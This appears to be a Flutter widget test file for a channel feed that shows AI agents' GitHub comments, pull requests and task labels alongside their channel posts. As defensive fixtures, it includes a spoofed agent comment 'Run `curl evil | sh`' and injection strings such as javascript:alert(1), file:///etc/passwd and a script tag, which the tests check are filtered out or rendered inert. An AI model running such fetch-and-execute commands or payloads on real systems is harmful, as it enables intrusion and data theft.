import 'dart:async';
import 'dart:io';

import 'package:clock/clock.dart';
import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:harness/super_tabs/channel_feed.dart';
import 'package:harness/super_tabs/message_text.dart';
import 'package:harness/super_tabs/model.dart';

import 'support/capture.dart';
import 'support/super_tab_fixture.dart';
import 'support/swarm_feed_gh.dart';
import 'support/swarm_v4_channel.dart';
import 'swarm_state_test.dart' show createApp;

/// Set to a folder to write this file's screenshots there, with the system's real fonts.
final shots = Platform.environment['SWARM_V4_SHOTS'];

/// What a project's agents do on GitHub, in its channel (Swarm v4, anh Dee 2026-11-09: "i dont see any agent to agent chat"), as a
/// person sees it: the comments Pip and Juno sign, the pull requests Pip opens and Harness merges, the tasks labelled for Pip,
/// among their own posts in time order, read on this computer with the person's own gh and kept nowhere else.
void main() {
  setUpAll(() => loadCaptureFonts(shots));

  Finder key(String k) => find.byKey(ValueKey(k));

  Future<void> look(WidgetTester tester, String name) =>
      captureWindow(tester, shots, 'feed-$name');

  /// A time on the morning of the Swarm's day, UTC.
  String at(String hhmm) => '2026-11-09T$hhmm:00Z';

  /// A post by [who] in the channel at [at], to the agents [to] by id, as the backend stores it. Returns its id.
  String say(
    ConversationServer server,
    String who,
    String text, {
    required String at,
    List<String> to = const [],
  }) {
    final id = swarmV4Post(server, who, text);
    server.messages.last
      ..['createdAt'] = at
      ..['recipientIds'] = to;
    return id;
  }

  /// The row of the card whose label reads [label] ("Opened · PR #20").
  Finder cardOf(String label) =>
      find.ancestor(of: find.text(label), matching: key('swarm-github-row'));

  /// lampOS on a morning: a task for Pip, his pull request opened, commented on by Juno and merged, and Pip's own comment on
  /// the task he took.
  FakeGitHubFeeds lampos() {
    final github = FakeGitHubFeeds();
    github.titles[12] = 'The voice declines in a busy room';
    github.labelled(
      13,
      'Voice: answer within a second',
      'builder:pip',
      at: at('06:55'),
    );
    github.pull(
      20,
      'Score the update rows again',
      branch: 'pip/12',
      opened: at('07:00'),
      merged: at('07:20'),
    );
    github.comment(
      12,
      'Pip, 07:05: Taking #12. Measuring the clips first.',
      at: at('07:05'),
    );
    github.comment(
      20,
      'Juno, 07:15, to Pip: READ-OK f6edb44\nThe retry path is covered; no P1.',
      at: at('07:15'),
      pull: true,
    );
    return github;
  }

  /// Their own posts in the channel: the plan at 06:50 and Pip free at 07:10.
  ConversationServer withPosts() {
    final server = swarmV4Channel();
    say(server, 'Faye', 'Plan: @Pip takes #12.', to: ['pip'], at: at('06:50'));
    say(server, 'Pip', 'free: Pip', at: at('07:10'));
    return server;
  }

  testWidgets(
    'what the agents do on GitHub is in the channel, in time order with their own posts',
    (tester) async {
      final github = lampos();
      await openSwarmV4(
        tester,
        withPosts(),
        github: github.github,
        size: const Size(1440, 1300),
      );
      // Each card says where it was, and stands with the face and name of the agent it is by.
      expect(key('swarm-github-row'), findsNWidgets(5));
      for (final (label, who) in [
        ('New task · #13', 'Pip'),
        ('Opened · PR #20', 'Pip'),
        ('Issue #12', 'Pip'),
        ('PR #20', 'Juno'),
        ('Merged · PR #20', 'Pip'),
      ]) {
        expect(
          find.descendant(of: cardOf(label), matching: find.text(who)),
          findsOneWidget,
          reason: '$label is $who\'s',
        );
      }
      expect(find.text('Voice: answer within a second'), findsOneWidget);
      expect(
        find.text('Pip, 07:05: Taking #12. Measuring the clips first.'),
        findsOneWidget,
      );
      expect(find.text('Juno, 07:15, to Pip: READ-OK f6edb44'), findsOneWidget);
      // In time order, mixed with the agents' own posts: the plan, the task, the pull request opened, Pip's comment, Pip free,
      // Juno's READ-OK, the merge.
      final top = [
        for (final finder in [
          find.textContaining('Plan: '),
          find.text('New task · #13'),
          find.text('Opened · PR #20'),
          find.text('Issue #12'),
          find.textContaining('free: Pip'),
          find.text('PR #20'),
          find.text('Merged · PR #20'),
        ])
          tester.getTopLeft(finder).dy,
      ];
      expect(top, orderedEquals([...top]..sort()));
      expect(top.toSet(), hasLength(7));
      expect(tester.takeException(), isNull);
      // The channel is still read-only, and says nothing of being empty.
      expect(key('super-agents-only'), findsOneWidget);
      expect(find.textContaining('No posts yet'), findsNothing);
      // Three reads of GitHub's lists, newest 50 of each, and nothing else.
      expect(github.reads('issues/comments'), 1);
      expect(github.reads('pulls'), 1);
      expect(github.reads('issues/events'), 1);
      expect(
        github.calls.every((call) => call.last.contains('per_page=50')),
        isTrue,
      );
    },
  );

  testWidgets('Read shows all of a comment and the way to it on GitHub', (
    tester,
  ) async {
    await openSwarmV4(
      tester,
      withPosts(),
      github: lampos().github,
      size: const Size(1440, 1300),
    );
    expect(find.textContaining('The retry path is covered'), findsNothing);
    await tester.tap(
      find.descendant(of: cardOf('PR #20'), matching: find.text('Read')),
    );
    await tester.pumpAndSettle();
    expect(find.textContaining('The retry path is covered'), findsOneWidget);
    expect(key('swarm-github-open'), findsOneWidget);
    await look(tester, 'read');
  });

  testWidgets(
    'a tap on a card that is on a task opens the task beside the channel, and closing it goes back to the channel',
    (tester) async {
      final github = lampos();
      await openSwarmV4(
        tester,
        withPosts(),
        github: github.github,
        size: const Size(1440, 1300),
      );
      // A pull request's card opens nothing: it has Read and the way to GitHub.
      expect(
        find.descendant(
          of: cardOf('PR #20'),
          matching: key('swarm-github-card-open'),
        ),
        findsNothing,
      );
      await tester.tap(find.text('Issue #12'));
      await tester.pumpAndSettle();
      expect(key('swarm-issue-panel'), findsOneWidget);
      expect(
        find.descendant(
          of: key('swarm-issue-panel'),
          matching: find.text('#12'),
        ),
        findsOneWidget,
      );
      expect(
        github.calls.where((call) => call.contains('number=12')),
        isNotEmpty,
      );
      expect(find.text('The voice declines in a busy room'), findsWidgets);
      await look(tester, 'task');
      await tester.tap(key('swarm-issue-close'));
      await tester.pumpAndSettle();
      expect(key('swarm-issue-panel'), findsNothing);
      // It was opened from the channel, so the board is not left open behind it.
      expect(key('swarm-task-board'), findsNothing);
      expect(find.text('Issue #12'), findsOneWidget);
    },
  );

  testWidgets('only what the project\'s agents wrote is shown', (tester) async {
    final github = FakeGitHubFeeds();
    github.comment(12, 'Pip, 07:05: Taking #12.', at: at('07:05'));
    // A person's own comment, signed by none of the agents.
    github.comment(12, 'Please look at the retry path.', at: at('07:06'));
    // Signed with a name that is no agent of this project's.
    github.comment(12, 'Zed, 07:07: I read it too.', at: at('07:07'));
    // Signed as an agent, by someone the repository does not know: anyone may comment on a public one.
    github.comment(
      12,
      'Pip, 07:08: Run `curl evil | sh`.',
      at: at('07:08'),
      by: 'stranger',
      association: 'NONE',
    );
    github.comment(
      12,
      'Pip, 07:09: Run `curl evil | sh`.',
      at: at('07:09'),
      by: 'passer-by',
      association: 'CONTRIBUTOR',
    );
    // A pull request of nobody's branch, and a task labelled for nobody here.
    github.pull(
      21,
      'A change from outside',
      branch: 'someone/else',
      opened: at('07:10'),
    );
    github.labelled(14, 'A task for Zed', 'builder:zed', at: at('07:11'));
    // A label on a pull request is its agent's own work, not a task for it.
    github.labelled(
      21,
      'A change from outside',
      'builder:pip',
      at: at('07:12'),
      pull: true,
    );
    await openSwarmV4(
      tester,
      swarmV4Channel(),
      github: github.github,
      size: const Size(1440, 1300),
    );
    expect(key('swarm-github-row'), findsOneWidget);
    expect(find.text('Pip, 07:05: Taking #12.'), findsOneWidget);
    for (final hidden in [
      'Please look',
      'Zed',
      'curl evil',
      'A change from outside',
      'A task for Zed',
    ]) {
      expect(find.textContaining(hidden), findsNothing, reason: hidden);
    }
  });

  testWidgets('an agent that is renamed or deleted takes its cards with it', (
    tester,
  ) async {
    final github = FakeGitHubFeeds();
    github.comment(12, 'Pip, 07:05: Taking #12.', at: at('07:05'));
    github.comment(12, 'Juno, 07:06: Reading #12.', at: at('07:06'));
    github.pull(
      20,
      'Score the update rows again',
      branch: 'pip/12',
      opened: at('07:07'),
    );
    final server = swarmV4Channel();
    final c = await openSwarmV4(
      tester,
      server,
      github: github.github,
      size: const Size(1440, 1300),
    );
    expect(key('swarm-github-row'), findsNWidgets(3));
    final agents = (server.state['agents'] as List)
        .cast<Map<String, dynamic>>();
    // Pip is renamed Pippin: what was signed Pip is nobody's now, and what Pippin signs is.
    agents.firstWhere((a) => a['id'] == 'pip')
      ..['name'] = 'Pippin'
      ..['displayName'] = 'Pippin';
    server.revision++;
    await tester.runAsync(c.refresh);
    await tester.pumpAndSettle();
    expect(find.text('Pip, 07:05: Taking #12.'), findsNothing);
    expect(find.text('Juno, 07:06: Reading #12.'), findsOneWidget);
    expect(key('swarm-github-row'), findsOneWidget);
    github.comment(12, 'Pippin, 07:30: Back on #12.', at: at('07:30'));
    await tester.pump(const Duration(seconds: 61));
    await tester.pumpAndSettle();
    expect(find.text('Pippin, 07:30: Back on #12.'), findsOneWidget);
    // Juno is deleted: its card goes, and nothing breaks.
    agents.removeWhere((a) => a['id'] == 'juno');
    server.revision++;
    await tester.runAsync(c.refresh);
    await tester.pumpAndSettle();
    expect(find.text('Juno, 07:06: Reading #12.'), findsNothing);
    expect(key('swarm-github-row'), findsOneWidget);
    expect(tester.takeException(), isNull);
  });

  testWidgets(
    '500 comments: the newest 50 are read, older pages as the list is scrolled up, and four pages at most',
    (tester) async {
      final github = FakeGitHubFeeds();
      for (var i = 1; i <= 500; i++) {
        final minute = (i % 60).toString().padLeft(2, '0');
        github.comment(
          12,
          'Pip, 00:$minute: comment number $i',
          at: DateTime.utc(
            2026,
            11,
            8,
            12,
          ).add(Duration(minutes: i)).toIso8601String(),
        );
      }
      await openSwarmV4(tester, swarmV4Channel(), github: github.github);
      expect(github.reads('issues/comments'), 1);
      expect(github.reads('issues/comments', page: 2), 0);
      expect(find.textContaining('comment number 500'), findsOneWidget);
      // A list of 500 draws what is on screen, not 500 cards.
      expect(key('swarm-github-row').evaluate().length, lessThan(20));
      // Up through the first page and into the next, which is read as the top of the first comes into view.
      Future<void> scrollUntil(String text) async {
        for (var i = 0; i < 400; i++) {
          if (find.textContaining(text).evaluate().isNotEmpty) return;
          await tester.dragFrom(const Offset(900, 450), const Offset(0, 800));
          await tester.pumpAndSettle();
        }
      }

      await scrollUntil('comment number 451');
      expect(find.textContaining('comment number 451'), findsOneWidget);
      await scrollUntil('comment number 401');
      expect(find.textContaining('comment number 401'), findsOneWidget);
      expect(github.reads('issues/comments', page: 2), 1);
      await scrollUntil('comment number 301');
      expect(find.textContaining('comment number 301'), findsOneWidget);
      // Four pages of fifty, and no more: what is older is on GitHub.
      expect(github.reads('issues/comments', page: 4), 1);
      expect(github.reads('issues/comments', page: 5), 0);
      for (var i = 0; i < 30; i++) {
        await tester.dragFrom(const Offset(900, 450), const Offset(0, 800));
        await tester.pumpAndSettle();
      }
      expect(github.reads('issues/comments', page: 5), 0);
      expect(find.textContaining('comment number 300'), findsNothing);
      expect(key('swarm-feed-earlier'), findsNothing);
      expect(tester.takeException(), isNull);
    },
  );

  group('when GitHub cannot be read the channel says so, in one line', () {
    Future<String> open(WidgetTester tester, FakeGitHubFeeds github) async {
      await openSwarmV4(tester, withPosts(), github: github.github);
      return tester.widget<Text>(key('swarm-feed-state')).data!;
    }

    for (final (failure, words) in [
      (
        FakeGitHubFailure.missing,
        'Install the GitHub CLI (gh) to see what your agents do on GitHub.',
      ),
      (FakeGitHubFailure.signedOut, 'Sign in to GitHub: run gh auth login.'),
      (
        FakeGitHubFailure.hidden,
        'You can\'t see autonomous-ai/lampOS on GitHub.',
      ),
      (FakeGitHubFailure.down, 'GitHub didn\'t answer. Try again.'),
    ]) {
      testWidgets('${failure.name}: $words', (tester) async {
        final github = lampos()..failure = failure;
        expect(await open(tester, github), words);
        // The channel's own posts are read all the same, and the line has its retry.
        expect(find.textContaining('free: Pip'), findsOneWidget);
        expect(key('swarm-feed-retry'), findsOneWidget);
        expect(key('swarm-github-row'), findsNothing);
        // Fixed, a retry reads it and the line goes.
        github.failure = null;
        await tester.tap(key('swarm-feed-retry'));
        await tester.pumpAndSettle();
        expect(key('swarm-feed-state'), findsNothing);
        expect(key('swarm-github-row'), findsWidgets);
      });
    }

    testWidgets(
      'limited: it says when it reads again, and asks nothing until then',
      (tester) async {
        final github = lampos()
          ..failure = FakeGitHubFailure.limited
          ..resetAt =
              clock
                  .now()
                  .add(const Duration(minutes: 10))
                  .millisecondsSinceEpoch ~/
              1000;
        final words = await open(tester, github);
        expect(
          words,
          startsWith('GitHub is limiting requests. Reading again at '),
        );
        final reads = github.calls.length;
        // Nothing is asked for the 9 minutes GitHub asked it to wait.
        await tester.pump(const Duration(minutes: 9));
        expect(github.calls.length, reads);
        github.failure = null;
        await tester.pump(const Duration(minutes: 2));
        await tester.pumpAndSettle();
        expect(github.calls.length, greaterThan(reads));
        expect(key('swarm-feed-state'), findsNothing);
        expect(key('swarm-github-row'), findsWidgets);
      },
    );

    testWidgets('a failure after cards were read keeps them, and says why', (
      tester,
    ) async {
      final github = lampos();
      await openSwarmV4(
        tester,
        withPosts(),
        github: github.github,
        size: const Size(1440, 1300),
      );
      expect(key('swarm-github-row'), findsNWidgets(5));
      github.failure = FakeGitHubFailure.down;
      await tester.pump(const Duration(seconds: 61));
      await tester.pumpAndSettle();
      expect(key('swarm-github-row'), findsNWidgets(5));
      expect(
        tester.widget<Text>(key('swarm-feed-state')).data,
        'GitHub didn\'t answer. Try again.',
      );
      await look(tester, 'stale');
    });
  });

  group('it reads while the channel is open and the app in front', () {
    int rounds(FakeGitHubFeeds github) => github.reads('issues/comments');

    testWidgets(
      'a round a minute, the comments each time and the pull requests and labels every third; an unchanged list is a 304 that draws nothing',
      (tester) async {
        final github = lampos();
        await openSwarmV4(
          tester,
          withPosts(),
          github: github.github,
          size: const Size(1440, 1300),
        );
        expect(rounds(github), 1);
        expect(github.reads('pulls'), 1);
        expect(github.reads('issues/events'), 1);
        expect(github.conditional, 0);
        await tester.pump(const Duration(seconds: 59));
        expect(rounds(github), 1);
        // The second round reads the comments alone, with their ETag, and is answered 304.
        await tester.pump(const Duration(seconds: 2));
        await tester.pumpAndSettle();
        expect(rounds(github), 2);
        expect(github.reads('pulls'), 1);
        expect(github.reads('issues/events'), 1);
        expect(github.conditional, 1);
        expect(key('swarm-github-row'), findsNWidgets(5));
        await tester.pump(const Duration(minutes: 1));
        expect(rounds(github), 3);
        expect(github.reads('pulls'), 1);
        // The fourth reads all three, each with its ETag.
        await tester.pump(const Duration(minutes: 1));
        expect(rounds(github), 4);
        expect(github.reads('pulls'), 2);
        expect(github.reads('issues/events'), 2);
        expect(github.conditional, 5);
        // Something new on GitHub is read at the next round, and shown.
        github.comment(12, 'Pip, 07:40: One more.', at: at('07:40'));
        await tester.pump(const Duration(seconds: 61));
        await tester.pumpAndSettle();
        expect(find.text('Pip, 07:40: One more.'), findsOneWidget);
        expect(key('swarm-github-row'), findsNWidgets(6));
      },
    );

    testWidgets('not while the app is behind, and at once on coming back', (
      tester,
    ) async {
      final github = lampos();
      final app = createApp();
      await openSwarmV4(tester, withPosts(), github: github.github, app: app);
      expect(rounds(github), 1);
      app.appLifecycleChanged(AppLifecycleState.paused);
      await tester.pump(const Duration(minutes: 5));
      expect(rounds(github), 1);
      app.appLifecycleChanged(AppLifecycleState.resumed);
      await tester.pump(const Duration(milliseconds: 10));
      expect(rounds(github), 2);
      // Back lately, it does not read twice: the next is a minute after that one.
      app.appLifecycleChanged(AppLifecycleState.paused);
      app.appLifecycleChanged(AppLifecycleState.resumed);
      await tester.pump(const Duration(milliseconds: 10));
      expect(rounds(github), 2);
      await tester.pump(const Duration(seconds: 61));
      expect(rounds(github), 3);
    });

    testWidgets('not while another chat is open', (tester) async {
      final github = lampos();
      await openSwarmV4(tester, withPosts(), github: github.github);
      expect(rounds(github), 1);
      await tester.tap(key('super-agent-pip'));
      await tester.pumpAndSettle();
      await tester.pump(const Duration(minutes: 5));
      expect(rounds(github), 1);
      await tester.tap(key('super-group-channel'));
      await tester.pumpAndSettle();
      expect(rounds(github), 2);
    });

    testWidgets('a failing read backs off: 1 min, then 2, then 4, up to 10', (
      tester,
    ) async {
      final github = lampos()..failure = FakeGitHubFailure.down;
      await openSwarmV4(tester, withPosts(), github: github.github);
      // Rounds at 0 s, 1 min, 3 min, 7 min and 15 min, then every 10.
      expect(rounds(github), 1);
      await tester.pump(const Duration(seconds: 61));
      expect(rounds(github), 2);
      await tester.pump(const Duration(seconds: 118));
      expect(rounds(github), 2);
      await tester.pump(const Duration(seconds: 2));
      expect(rounds(github), 3);
      await tester.pump(const Duration(seconds: 238));
      expect(rounds(github), 3);
      await tester.pump(const Duration(seconds: 2));
      expect(rounds(github), 4);
      await tester.pump(const Duration(seconds: 478));
      expect(rounds(github), 4);
      await tester.pump(const Duration(seconds: 2));
      expect(rounds(github), 5);
      await tester.pump(const Duration(minutes: 9, seconds: 58));
      expect(rounds(github), 5);
      await tester.pump(const Duration(seconds: 2));
      expect(rounds(github), 6);
      // A round that works brings it back to a minute.
      github.failure = null;
      await tester.pump(const Duration(minutes: 10, seconds: 1));
      expect(rounds(github), 7);
      await tester.pump(const Duration(seconds: 61));
      expect(rounds(github), 8);
    });

    testWidgets('a project with no repository on GitHub reads nothing', (
      tester,
    ) async {
      final github = lampos();
      final server = withPosts();
      (server.state['projects'] as List)
          .cast<Map<String, dynamic>>()
          .first
          .remove('repository');
      await openSwarmV4(tester, server, github: github.github);
      await tester.pump(const Duration(minutes: 2));
      expect(github.calls, isEmpty);
      expect(key('swarm-feed-state'), findsNothing);
      expect(find.textContaining('free: Pip'), findsOneWidget);
    });
  });

  group('empty', () {
    testWidgets(
      'the channel does not say it is empty while GitHub has not answered',
      (tester) async {
        final github = FakeGitHubFeeds()..hold = Completer<void>();
        await openSwarmV4(tester, swarmV4Channel(), github: github.github);
        expect(find.textContaining('No posts yet'), findsNothing);
        github.hold!.complete();
        await tester.pumpAndSettle();
        expect(find.textContaining('No posts yet'), findsOneWidget);
      },
    );

    testWidgets(
      'a channel with no posts shows what its agents did on GitHub, not that it is empty',
      (tester) async {
        await openSwarmV4(tester, swarmV4Channel(), github: lampos().github);
        expect(find.textContaining('No posts yet'), findsNothing);
        expect(key('swarm-github-row'), findsWidgets);
      },
    );
  });

  testWidgets(
    'what comes from outside is text: no image is fetched and no link runs',
    (tester) async {
      final github = FakeGitHubFeeds();
      github.comment(
        12,
        'Pip, 07:05: see ![pixel](https://tracker.example/p.png) and [click](javascript:alert(1)) and [file](file:///etc/passwd)\n'
        '<script>alert(1)</script> <img src="https://tracker.example/x.png">',
        at: at('07:05'),
      );
      await openSwarmV4(tester, swarmV4Channel(), github: github.github);
      await tester.tap(find.text('Read'));
      await tester.pumpAndSettle();
      expect(find.byType(Image), findsNothing);
      // Only a web address is a link.
      expect(SuperTabMessageText.webLink('javascript:alert(1)'), isNull);
      expect(SuperTabMessageText.webLink('file:///etc/passwd'), isNull);
      expect(tester.takeException(), isNull);
    },
  );

  for (final (name, size, brightness) in const [
    ('1440', Size(1440, 900), Brightness.light),
    ('1024', Size(1024, 700), Brightness.light),
    ('700', Size(700, 800), Brightness.light),
    ('dark', Size(1440, 900), Brightness.dark),
  ]) {
    testWidgets('the channel with its agents on GitHub, at $name', (
      tester,
    ) async {
      await openSwarmV4(
        tester,
        withPosts(),
        github: lampos().github,
        size: size,
        brightness: brightness,
      );
      expect(key('swarm-github-row'), findsWidgets);
      expect(tester.takeException(), isNull);
      await look(tester, 'channel-$name');
    });
  }

  group('the feed itself', () {
    SuperTabAgent agent(String id, String name) => SuperTabAgent.fromJson({
      'id': id,
      'projectId': 'lampos',
      'name': name,
      'machineId': 'host',
      'harnessId': 'h-$id',
      'contributorId': 'owner',
      'configuration': {'engine': 'claude'},
    });
    final agents = [agent('pip', 'Pip'), agent('juno', 'Juno')];

    SwarmChannelFeed feedOf(FakeGitHubFeeds github) => SwarmChannelFeed(
      github: github.github,
      repository: github.repository,
      channelId: 'channel',
    );

    /// The cards the feed draws among the channel's rows, oldest first.
    List<SuperTabMessage> cards(SwarmChannelFeed feed) => [
      for (final row in feed.mixedInto(const [], agents))
        if (row.source['kind'] == 'github') row,
    ];

    String minutes(int i) => DateTime.utc(
      2026,
      11,
      8,
      12,
    ).add(Duration(minutes: i)).toIso8601String();

    testWidgets(
      'a newest page joins what is held when it overlaps it, and stands alone when it does not',
      (tester) async {
        final github = FakeGitHubFeeds();
        for (var i = 1; i <= 120; i++) {
          github.comment(12, 'Pip, 00:00: number $i', at: minutes(i));
        }
        final feed = feedOf(github);
        addTearDown(feed.dispose);
        await tester.runAsync(feed.read);
        // 120 to 71 are held, and older ones are to be read.
        expect(cards(feed), hasLength(50));
        expect(feed.hasMore, isTrue);
        await tester.runAsync(feed.more);
        expect(cards(feed), hasLength(100));
        // Ten new ones overlap what is held, so the older page stays.
        for (var i = 121; i <= 130; i++) {
          github.comment(12, 'Pip, 00:00: number $i', at: minutes(i));
        }
        await tester.runAsync(feed.read);
        expect(cards(feed), hasLength(110));
        // A hundred new ones in a pause: a page of fifty that starts after everything held is read alone, and what lay before
        // it is read again when asked for, never shown as if nothing lay between.
        for (var i = 131; i <= 230; i++) {
          github.comment(12, 'Pip, 00:00: number $i', at: minutes(i));
        }
        await tester.runAsync(feed.read);
        expect(cards(feed), hasLength(50));
        expect(feed.hasMore, isTrue);
        expect(cards(feed).first.text, contains('number 181'));
      },
    );

    testWidgets(
      'a comment deleted on GitHub leaves, and an unchanged read tells nobody',
      (tester) async {
        final github = FakeGitHubFeeds();
        github.comment(12, 'Pip, 07:05: one', at: at('07:05'));
        github.comment(12, 'Pip, 07:06: two', at: at('07:06'));
        final feed = feedOf(github);
        addTearDown(feed.dispose);
        var told = 0;
        feed.addListener(() => told++);
        await tester.runAsync(feed.read);
        expect(told, 1);
        expect(cards(feed), hasLength(2));
        await tester.runAsync(feed.read);
        // A 304: nothing changed, so nothing is told. The round read the comments alone.
        expect(told, 1);
        expect(github.conditional, 1);
        github.deleteComment(0);
        await tester.runAsync(feed.read);
        expect(told, 2);
        expect(cards(feed).map((card) => card.text).single, contains('one'));
      },
    );

    testWidgets(
      'a feed reads nothing until it is told it is shown, and nothing after it is hidden',
      (tester) async {
        final github = lampos();
        final feed = feedOf(github);
        addTearDown(feed.dispose);
        await tester.pump(const Duration(minutes: 5));
        expect(github.calls, isEmpty);
        feed.active = true;
        await tester.pump(const Duration(milliseconds: 10));
        expect(github.reads('issues/comments'), 1);
        feed.active = false;
        await tester.pump(const Duration(minutes: 5));
        expect(github.reads('issues/comments'), 1);
      },
    );
  });
}
